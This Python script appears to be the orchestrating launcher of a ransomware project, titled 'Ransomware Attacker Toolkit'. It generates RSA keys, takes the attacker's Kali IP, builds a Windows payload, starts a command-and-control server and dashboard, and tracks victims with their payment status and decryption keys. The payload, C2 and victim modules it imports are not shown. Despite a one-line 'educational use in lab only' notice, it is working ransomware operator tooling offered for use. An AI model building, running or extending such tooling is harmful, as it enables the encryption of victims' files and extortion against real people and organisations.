#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import time
import webbrowser
from datetime import datetime
from src.payload_builder import build_windows_payload

class AttackerToolkit:
    def __init__(self):
        self.kali_ip = None
        self.c2_process = None
    
    def print_banner(self):
        # Display toolkit banner
        banner = """
        ╔══════════════════════════════════════════════════════════╗
        ║            RANSOMWARE ATTACKER TOOLKIT - KALI            ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def generate_keys(self):
        # Generate RSA encryption keys
        print("[1/4]  Generating encryption keys...")
        
        try:
            # Import and run key generation
            sys.path.append('.')
            from src.generate_key import generate_rsa_keys
            generate_rsa_keys()
            print("    RSA keys generated in Keys/ directory")
            return True
        except Exception as e:
            print(f"   x Failed to generate keys: {e}")
            return False
    
    def get_kali_ip(self):

        #Get Kali Linux IP address

        # print("[2/4] 🌐 Detecting network configuration...")
        
        # try:
        #     # Try different methods to get IP
        #     import socket
        #     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #     s.connect(("8.8.8.8", 80))
        #     self.kali_ip = s.getsockname()[0]
        #     s.close()
            
        #     print(f"   ✅ Your Kali IP: {self.kali_ip}")
        #     print(f"   [*] Use this IP in victim payload")
        #     return True
        # except:
        #     print("   ❌ Could not auto-detect IP")
        #     self.kali_ip = input("   [?] Enter your Kali IP manually: ").strip()
        #     return bool(self.kali_ip)
        
        self.kali_ip = input("[2/4] 🌐 Enter your Kali Linux IP address: ").strip()
        build_windows_payload(self.kali_ip)
        if self.kali_ip:
            print(f"    Using Kali IP: {self.kali_ip}")
            return True
        else:
            print("   x No IP provided")
            return False
    
    def start_c2_server(self):
        # Start the C2 server in background
        print("[3/4] Starting C2 Command Server...")
        
        def run_c2():
            try:
                from src.c2_server import C2Server
                server = C2Server()
                server.run()
            except Exception as e:
                print(f"   x C2 Server error: {e}")
        
        # Start C2 in background thread
        c2_thread = threading.Thread(target=run_c2, daemon=True)
        c2_thread.start()
        
        # Give server time to start
        time.sleep(3)
        print("    C2 Server started on http://localhost:5000")
        return True
    
    def open_dashboard(self):
        # Open C2 dashboard in browser
        print("[4/4]  Opening C2 Dashboard...")
        
        try:
            webbrowser.open("http://localhost:5000")
            print("   Dashboard opened in browser")
            print("\n" + "="*60)
            print("ATTACKER TOOLKIT READY!")
            print("="*60)
            print("\n📋 Next Steps:")
            print("1. Send payload to Windows VM")
            print("2. Run payload on Windows VM")
            print("3. Monitor victims at: http://localhost:5000")
            print("4. Use victim_manager.py to manage victims")
            print("\n[?]  Remember: Educational use in lab only!")
            return True
        except:
            print("   ?  Could not open browser automatically")
            print("   [*] Manually visit: http://localhost:5000")
            return True
    
    def show_menu(self):
        # Show interactive menu after setup
        while True:
            print("\n" + "="*60)
            print("🛠️  ATTACKER TOOLKIT MENU")
            print("="*60)
            print("1. 👥 View/manage victims")
            print("2. 🖥️  Open C2 dashboard")
            print("3. 📋 Show victim database")
            print("4. 🔑 Show generated keys")
            print("5. 🚪 Exit")
            print("="*60)
            
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                self.manage_victims()
            elif choice == "2":
                self.open_dashboard()
            elif choice == "3":
                self.show_victim_db()
            elif choice == "4":
                self.show_keys()
            elif choice == "5":
                print("\nExiting Attacker Toolkit...")
                break
            else:
                print("[❌] Invalid choice")
    
    def manage_victims(self):
        """Manage victims using victim_manager"""
        try:
            from src.victim_manager import list_victims, decrypt_file_for_victim
            
            print("\n" + "="*60)
            print("👥 VICTIM MANAGEMENT")
            print("="*60)
            
            list_victims()
            
            victim_id = input("\nEnter victim ID to get key (or press Enter to skip): ").strip()
            if victim_id:
                decrypt_file_for_victim(victim_id)
            
            input("\nPress Enter to continue...")
            
        except Exception as e:
            print(f"[❌] Error: {e}")
    
    def show_victim_db(self):
        """Show raw victim database"""
        import sqlite3
        
        print("\n" + "="*60)
        print("VICTIM DATABASE")
        print("="*60)
        
        try:
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("SELECT * FROM victims")
            victims = c.fetchall()
            conn.close()
            
            if not victims:
                print("No victims yet")
            else:
                for v in victims:
                    print(f"\nID: {v[0]}")
                    print(f"  IP: {v[1]} | OS: {v[2]}")
                    print(f"  Files: {v[3]} | Paid: {'✅' if v[5] else '❌'}")
                    print(f"  Time: {v[6]}")
        except:
            print("No victim database found")
    
    def show_keys(self):
        # Show generated encryption keys
        print("\n" + "="*60)
        print("🔑 ENCRYPTION KEYS")
        print("="*60)
        
        data_dir = os.path.join(os.path.dirname(__file__), "data")
        
        priv_path = os.path.join(data_dir, "operational_private.pem")
        pub_path = os.path.join(data_dir, "operational_public.pem")
        
        if os.path.exists(priv_path):
            with open(priv_path, "r") as f:
                priv_key = f.read().strip()
                print("Private Key (KEEP SECURE!):")
                print("-"*40)
                print(priv_key[:100] + "...")
                print("-"*40)
        
        if os.path.exists(pub_path):
            with open(pub_path, "r") as f:
                pub_key = f.read().strip()
                print("\nPublic Key (Embed in payloads):")
                print("-"*40)
                print(pub_key[:100] + "...")
                print("-"*40)
    
    def run(self):
        # Main execution flow
        self.print_banner()
        
        # Check if running as root (optional for Kali)
        if os.geteuid() != 0:
            print("? Running without root privileges")
        
        # Ask for confirmation
        print("[?] This will set up the ransomware attacker toolkit.")
        confirm = input("Continue? (yes/no): ").lower()
        
        if confirm != "yes":
            print("[👋] Operation cancelled")
            return
        
        # Run setup steps
        steps = [
            self.generate_keys,
            self.get_kali_ip,
            self.start_c2_server,
            lambda: build_windows_payload(self.kali_ip),
            self.open_dashboard
        ]
        
        for i, step in enumerate(steps):
            if not step():
                print(f"\n[❌] Setup failed at step {i+1}")
                print("[*] Check logs and try again")
                return
        
        # Show interactive menu
        self.show_menu()

def main():
    # Main entry point
    toolkit = AttackerToolkit()
    toolkit.run()

if __name__ == "__main__":
    main()
